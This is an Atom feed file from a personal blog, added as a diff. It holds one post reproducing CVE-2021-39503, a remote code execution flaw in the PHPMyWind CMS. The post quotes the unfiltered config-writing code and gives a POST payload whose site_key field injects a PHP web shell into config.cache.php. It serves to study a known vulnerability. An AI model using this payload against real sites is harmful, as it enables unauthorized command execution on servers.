@@ -1,0 +1,126 @@
+<?xml version="1.0"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>http://symlpigeon.github.io</id>
+    <title>symlpigeon&#39;s little gensokyo • Posts by &#34;远程代码执行&#34; tag</title>
+    <link href="http://symlpigeon.github.io" />
+    <updated>2021-12-06T14:33:32.000Z</updated>
+    <category term="远程代码执行" />
+    <category term="对称密码和安全" />
+    <category term="安全多方计算" />
+    <category term="ELF" />
+    <category term="Linux" />
+    <category term="网络协议安全" />
+    <category term="密钥分配" />
+    <category term="用户认证" />
+    <category term="逆向工程" />
+    <category term="x86" />
+    <category term="数论" />
+    <category term="整数环上的密码" />
+    <category term="椭圆曲线" />
+    <category term="栈溢出" />
+    <entry>
+        <id>http://symlpigeon.github.io/2021/12/06/CVE-2021-39503/</id>
+        <title>CVE-2021-39503复现</title>
+        <link rel="alternate" href="http://symlpigeon.github.io/2021/12/06/CVE-2021-39503/"/>
+        <content type="html">&lt;h1 id=&#34;概述&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#概述&#34;&gt;#&lt;/a&gt; 概述&lt;/h1&gt;
+&lt;p&gt;CVE-2021-39503 是 PHPMyWind 平台的远程代码执行（Remote Code Execution）漏洞。PHPMyWind 这个平台基本上可以说算是凉了，上一次维护都已经几年之前了，近期一些 Issue 中间也提到了一些其他的漏洞，但是开发人员也都没有进行维护。&lt;/p&gt;
+&lt;p&gt;PHPMyWind 是一个网站管理工具，从观感上面来说应该类似于宝塔之类的建站工具。&lt;/p&gt;
+&lt;p&gt;在过去几年中，这个平台就出现了大量的漏洞，如 CVE-2020-19964（CSRF），CVE-2019-8435（XSS），CVE-2018-17131（RCE）等。&lt;/p&gt;
+&lt;p&gt;这个漏洞是用户登陆之后，在新建网站页面输入网站信息时，程序并没有对用户的输入进行有效过滤，使得用户能够注入脚本实现任意代码执行。&lt;/p&gt;
+&lt;h1 id=&#34;漏洞描述&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞描述&#34;&gt;#&lt;/a&gt; 漏洞描述&lt;/h1&gt;
+&lt;p&gt;PHPMyWind 的代码结构是这样的：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;PHPMyWind
+  -include
+    - config.cache.php  // 恶意脚本注入的位置
+    - ...
+  - admin
+    - site_save.php     // 存在RCE注入点的位置
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;主要的注入点在 admin/site_save.php 下，我们阅读其中 “添加新站点” 部分的代码：&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 添加新站点&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$action&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;add&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token variable&#34;&gt;$r&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$dosql&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;GetOne&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;SELECT `id` FROM `&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$tbname&lt;/span&gt;&lt;/span&gt;` WHERE `sitekey`=&#39;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$site_key&lt;/span&gt;&lt;/span&gt;&#39;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$r&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;id&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token function&#34;&gt;ShowMsg&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;该站点标识已存在！&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;-1&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token keyword&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token variable&#34;&gt;$sql&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;INSERT INTO `&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$tbname&lt;/span&gt;&lt;/span&gt;` (`sitename`, `sitekey`, `sitelang`) VALUES (&#39;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$site_name&lt;/span&gt;&lt;/span&gt;&#39;, &#39;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$site_key&lt;/span&gt;&lt;/span&gt;&#39;, &#39;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$site_lang&lt;/span&gt;&lt;/span&gt;&#39;)&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$dosql&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;ExecNoneQuery&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$sql&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token variable&#34;&gt;$newsiteid&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$dosql&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;GetLastID&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token variable&#34;&gt;$data_str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;INSERT INTO `#@__webconfig` VALUES(&#39;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$newsiteid&lt;/span&gt;&lt;/span&gt;&#39;,&#39;cfg_webname_&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$site_key&lt;/span&gt;&lt;/span&gt;&#39;,&#39;网站名称&#39;,&#39;0&#39;,&#39;string&#39;,&#39;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$webname&lt;/span&gt;&lt;/span&gt;&#39;,&#39;1&#39;);&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		INSERT INTO `#@__webconfig` VALUES(&#39;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$newsiteid&lt;/span&gt;&lt;/span&gt;&#39;,&#39;cfg_weburl_&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$site_key&lt;/span&gt;&lt;/span&gt;&#39;,&#39;网站地址&#39;,&#39;0&#39;,&#39;string&#39;,&#39;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$weburl&lt;/span&gt;&lt;/span&gt;&#39;,&#39;2&#39;);&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		...&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        ...&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        INSERT INTO `#@__webconfig` VALUES(&#39;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$newsiteid&lt;/span&gt;&lt;/span&gt;&#39;,&#39;cfg_switchshow_&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$site_key&lt;/span&gt;&lt;/span&gt;&#39;,&#39;关闭说明&#39;,&#39;0&#39;,&#39;bstring&#39;,&#39;对不起，网站维护，请稍后登录。&amp;lt;br /&gt;网站维护期间对您造成的不便，请谅解！&#39;,&#39;13&#39;);&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token variable&#34;&gt;$querys&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;explode&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$data_str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token keyword&#34;&gt;foreach&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$querys&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$sql&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;trim&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$sql&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;continue&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			&lt;span class=&#34;token variable&#34;&gt;$dosql&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;ExecNoneQuery&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$sql&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token function&#34;&gt;WriteConfig&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&amp;lt;script type=&#34;text/javascript&#34;&gt;window.top.location.reload();&amp;lt;/script&gt;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token keyword&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;这一部分代码将用户输入的数据暂时存入数据库中，我们可以看到在 echo 之前这里调用了 &lt;code&gt;WriteConfig()&lt;/code&gt;  函数，我们下面进入该函数进行分析：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-PHP&#34;&gt;//更新配置函数
+function WriteConfig()
+&amp;#123;
+	global $dosql;
+
+
+	$str = &#39;&amp;lt;?php	if(!defined(\&#39;IN_PHPMYWIND\&#39;)) exit(\&#39;Request Error!\&#39;);&#39;.&amp;quot;\r\n\r\n&amp;quot;;
+	$dosql-&amp;gt;Execute(&amp;quot;SELECT `varname`,`vartype`,`varvalue`,`vargroup` FROM `#@__webconfig` ORDER BY `orderid` ASC&amp;quot;);
+	while($row = $dosql-&amp;gt;GetArray())
+	&amp;#123;
+		//统计代码转义
+		if($row[&#39;varname&#39;] == &#39;cfg_countcode&#39;)
+		&amp;#123;
+			$row[&#39;varvalue&#39;] = stripslashes($row[&#39;varvalue&#39;]);
+		&amp;#125;
+
+		if($row[&#39;vartype&#39;] == &#39;number&#39;)
+		&amp;#123;
+			if($row[&#39;varvalue&#39;] == &#39;&#39;)
+			&amp;#123;
+				$row[&#39;varvalue&#39;] = 0;
+			&amp;#125;
+
+			$str .= &amp;quot;\$&amp;#123;$row[&#39;varname&#39;]&amp;#125; = &amp;quot;.$row[&#39;varvalue&#39;].&amp;quot;;\r\n&amp;quot;;
+		&amp;#125;
+		else
+		&amp;#123;
+			$str .= &amp;quot;\$&amp;#123;$row[&#39;varname&#39;]&amp;#125; = &#39;&amp;quot;.str_replace(&amp;quot;&#39;&amp;quot;,&#39;&#39;,$row[&#39;varvalue&#39;]).&amp;quot;&#39;;\r\n&amp;quot;;
+		&amp;#125;
+	&amp;#125;
+	$str .= &#39;?&amp;gt;&#39;;
+
+	Writef(PHPMYWIND_INC.&#39;/config.cache.php&#39;,$str);
+&amp;#125;
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;可以看到，其中涉及到了删除用户输入字符串中的反斜杠，同时也过滤了单引号，但是这里并没有对用户输入的 &amp;lt;,&amp;gt;, ?, =,... 等特殊字符进行过滤，也就是说我们可以构造特定的代码实现攻击。&lt;/p&gt;
+&lt;p&gt;而我们观察上面的代码可以看到，最后 &lt;code&gt;Writef&lt;/code&gt;  函数将 &lt;code&gt;str&lt;/code&gt;  写入了 &lt;code&gt;config.cache.php&lt;/code&gt;  文件中。也就是说这整个 &lt;code&gt;WriteConfig&lt;/code&gt;  函数实际上就是构造了一段 PHP 脚本，而其中我们可以自己控制一些部分去进行构造。&lt;/p&gt;
+&lt;p&gt;我们来看一下 &lt;code&gt;config.cache.php&lt;/code&gt;  的内容：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-PHP&#34;&gt;&amp;lt;?php	if(!defined(&#39;IN_PHPMYWIND&#39;)) exit(&#39;Request Error!&#39;);
+
+
+$cfg_webname = &#39;我的网站&#39;;
+$cfg_webname_MYSITEKEY = &#39;MY_SITE_KEY&#39;;
+$cfg_weburl = &#39;http://phpmywind.net&#39;;
+$cfg_webpath = &#39;&#39;;
+$cfg_author = &#39;&#39;;
+$cfg_generator = &#39;PHPMyWind CMS&#39;;
+...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;实际上，上面的 $cfg_webname_&lt;strong&gt;MYSITEKEY&lt;/strong&gt; 是可以自行修改的，这里取决于用户输入的数据，我们可以在这里构造攻击脚本。&lt;/p&gt;
+&lt;h1 id=&#34;漏洞复现&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞复现&#34;&gt;#&lt;/a&gt; 漏洞复现&lt;/h1&gt;
+&lt;h2 id=&#34;环境&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#环境&#34;&gt;#&lt;/a&gt; 环境&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Ubuntu 18.04 LTS&lt;/li&gt;
+&lt;li&gt;Apache2 + PHP 7.2 + MySQL 5.7&lt;/li&gt;
+&lt;li&gt;PHPMyWind 5.6&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;复现&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#复现&#34;&gt;#&lt;/a&gt; 复现&lt;/h2&gt;
+&lt;p&gt;我们启动环境，连接服务器并登陆，能够正常连接上：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image-20211109013411680.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;接下来，我们发送一个正常的请求并对数据包进行截获：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image-20211109015602811.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;BurpSuite 截获的数据包如下：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image-20211109015702387.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;我们修改 POST 的 site_key 参数，构造这样的 payload：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;site_name=Web%E5%AE%89%E5%85%A8-test&amp;amp;
+site_key=symlXDSEC?&amp;gt;&amp;lt;?=`$_GET[0]`?&amp;gt;&amp;lt;?&amp;amp;
+site_lang=en_US&amp;amp;webname=test_CVE&amp;amp;
+weburl=http%3A%2F%2F************%2FtestCVE&amp;amp;
+webpath=testCVE&amp;amp;
+webswitch=Y&amp;amp;
+action=add
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;image-20211109020353714.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;接下来，可以通过 POST 请求向其中传入指令进行远程执行：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image-20211109021417591.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;至此，复现完成。&lt;/p&gt;
+&lt;h1 id=&#34;总结&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#总结&#34;&gt;#&lt;/a&gt; 总结&lt;/h1&gt;
+&lt;p&gt;做这个漏洞复现的主要目的在于帮人写掉一次 Web 安全大作业，于是随手搜了一个 CVE，抱着根本看不懂的决心去复现的（x），结果发现这个漏洞是真的极其弱智……&lt;/p&gt;
+&lt;p&gt;没意思，下次不整了。&lt;/p&gt;
+</content>
+        <category term="远程代码执行" />
+        <updated>2021-12-06T14:33:32.000Z</updated>
+    </entry>
+</feed>
